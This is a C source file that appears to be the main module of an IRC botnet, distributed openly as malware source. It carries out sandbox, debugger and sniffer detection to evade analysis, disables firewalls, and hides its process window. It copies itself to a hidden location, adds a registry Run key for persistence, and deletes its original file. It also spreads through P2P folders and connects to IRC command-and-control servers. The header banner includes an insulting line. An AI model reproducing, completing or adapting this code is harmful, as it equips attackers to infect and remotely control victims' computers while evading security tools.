/*
		.   ..---..-. 
		|\  ||   (   )
		| \ ||--- `-. 
		|  \||   (   )bot [version 5]
		'   ''---'`-' [msn,tor,yah,p2p,usb,cd-rom,rem-drive]
		Ripped - Copy - Paste

  Everyone is gay
*/

#include "../h/includes.h"
#include "../h/functions.h"
#include "../configs.h"

#pragma comment(linker, "/subsystem:windows ")

DWORD dwstarted;
DWORD dwconnected;
IRC mainirc;
HANDLE xetum;
int curserver;
int srvsz=(sizeof(sinfo)/sizeof(SERVER));
int authsize=(sizeof(authost)/sizeof(LPTSTR));
#ifndef NO_VERSION_REPLY
int curversion;
int versionsize=(sizeof(versionlist)/sizeof(LPTSTR));
#else
int versionsize=0;
#endif

char exip[MAX_IP];
char inip[MAX_IP];
char host[MAX_HOSTNAME];

extern char str_main_thread[];
extern char str_rup_thread[];
extern char str_asecure_thread[];

#ifndef _DEBUG
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
#else
int main(int argc, char *argv[])
#endif
{
char msg[256];
   LoadDLLs();

	unsigned char szBytes[] = { 0xc8, 0x0, 0x4, 0x0, 0x60 }; 
    DWORD dwAddr = (DWORD)GetProcAddress(LoadLibrary("user32.dll"), "MessageBoxA"); 

    if(!memcmp((LPVOID)dwAddr, (LPVOID)szBytes, sizeof(szBytes))) 
    { 
        ExitProcess(0); 
    }

	/* ++ Anti-Taskmgr ++ */
	void AntiTaskManager( void* pVoid );
	HANDLE hProcess;
	hProcess = GetCurrentProcess();

	/* +++ SANDBOX +++ */
	if (AntiSandBox())
		return 0;

	if (AntiAnubis())
		return 0;

	if (AntiSandboxie())
		return 0;	

	/* ++ Private Anti-Debug+ProcessViewers+Sniffers by carve ++ */
	if (EtherDetect())
		return 0;

	if (WireShark())
		return 0;

	if (PacketAnalyzer())
		return 0;

	if (TCPView())
		return 0;

	if (ProcMon())
		return 0;

	if (ProcExplr())
		return 0;

	if (FileMon())
		return 0;

	if (PIAFCTM())
		return 0;

	if (PIAFCTM2())
		return 0;

	if (SwitchSnifferRegd())
		return 0;

	if (SwitchSnifferUnRegd())
		return 0;

	if (CurrProcess())
		return 0;

	if (SecurityTM())
		return 0;

	if (ASaPV())
		return 0;

	if (RemoteProcViewer())
		return 0;

	if (ProcHeapViewer())
		return 0;

	if (Soft191ProcViewer())
		return 0;
	/* ++ Private Anti-Debug+ProcessViewers+Sniffers by carve ++ */


	/* +++ ANTIFW +++ */
	DWORD dwThreadId;
	HANDLE hFW;
	hFW = CreateThread(NULL, 0, antifw, NULL, 0, &dwThreadId);


#ifndef NO_CRYPT
	//decryptstrings(authsize, versionsize, srvsz);
#endif

#ifndef NO_SERVICE
	SERVICE_TABLE_ENTRY servicetable[] =
	{
		{servicename, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
		{NULL, NULL}
	};
#endif

	char cpbot[MAX_PATH];
	char movetopath[MAX_PATH];
	char spath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(gotopth,movetopath,sizeof(movetopath));
	sprintf(spath,"%s\\%s",movetopath,exename);
	
#ifndef _DEBUG
	if (MoveBot(movetopath,exename))
	{
#ifndef NO_MELT
		RegWrite(mkey.hkey,mkey.subkey,mkey.name,cpbot);
#endif // NO_MELT

    HKEY hndKey = NULL;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
	RegSetValueEx(hndKey,szRegname,0, REG_SZ,(const unsigned char *)exename,strlen(exename));
	RegCloseKey(hndKey);
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
#ifdef _DEBUG
		sinfo.wShowWindow = SW_SHOW;
#else
		sinfo.wShowWindow = SW_HIDE;
#endif // _DEBUG

		if (CreateProcess(spath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL,movetopath,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}

		ExitProcess(1);
	}
#endif // _DEBUG
#ifndef NO_SERVICE
	if(fStartServiceCtrlDispatcher(servicetable) == 0)
		InstallService(spath);
#else

	// Execute P2P spread on install
    InfectP2P_ProgramFiles(); 
	// Execute P2P spread on install

	HANDLE threadhandle;
	DWORD id;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Bthd, NULL, 0, &id)) == 0) 
		return 0;

	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
	return 0;
#endif // NO_SERVICE
#ifdef _DEBUG
#endif
	return 0;
}

DWORD WINAPI Bthd(LPVOID param)
{
	for (int m=0;m<6;m++)
	{
		if(!(xetum=CreateMutex(NULL, FALSE, xetumhandle)))
				Sleep(5000);
		else
			break;
	}
	if (WaitForSingleObject(CreateMutex(NULL, TRUE, xetumhandle), 30000) == WAIT_TIMEOUT)
		ExitProcess(0);

	addthread(MAIN_THREAD,str_main_thread,main_title);

#ifndef _DEBUG
#ifndef NO_MELT
	char *melt=RegQueryValue(mkey.hkey,mkey.subkey,mkey.name);
		if (melt)
		{
			SetFileAttributes(melt,FILE_ATTRIBUTE_NORMAL);
			int tries=0;
			while (FileExists(melt) && tries<3)
			{
				DeleteFile(melt);
				tries++;
				Sleep(2000);
			}
			RegDelete(mkey.hkey,mkey.subkey,mkey.name);
		}
#endif // NO_MELT
#endif // _DEBUG

	srand(GetTickCount());
	dwstarted=GetTickCount();


	WSADATA wsadata;
	if (fWSAStartup(MAKEWORD(2,2),&wsadata)!=0)
		ExitProcess(-2);

	
	int i=0;
	DWORD id=0;




#ifndef _DEBUG
//	RegWrite(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control","WaitToKillServiceTimeout","7000");
#endif
	
	//get internal ip
	char *ip;
	char hostname[256];
	struct hostent *h;
	fgethostname(hostname, 256);
	h = fgethostbyname(hostname);
	ip = finet_ntoa(*(struct in_addr *)h->h_addr_list[0]);
	strncpy(inip,ip,sizeof(inip));

	curserver=0;
	HookProtocol(&mainirc);
	
	while (mainirc.should_connect()) {
		if (!mainirc.is_connected())
		{
		#ifdef _DEBUG
			printf("Trying to connect to: %s:%i\r\n",sinfo[curserver].host,sinfo[curserver].port);
		#endif
		#ifndef NO_FLUSHDNS
			FlushDNSCache();
		#endif
			mainirc.start(sinfo[curserver].host,sinfo[curserver].port,
					  mainirc.nickgen(NICK_TYPE,REQ_NICKLEN),mainirc.nickgen(IDENT_TYPE,REQ_IDENTLEN),
					  mainirc.nickgen(REALN_TYPE,REQ_REALNLEN),sinfo[curserver].pass);
			mainirc.message_loop();
		}
		else
			mainirc.message_loop();

		Sleep(SFLOOD_DELAY);
		
		if (curserver==(srvsz-1))
			curserver=0;
		else
			curserver++;
	}

	fWSACleanup();
	ReleaseMutex(xetum);
	ExitThread(0);

		return TRUE;
}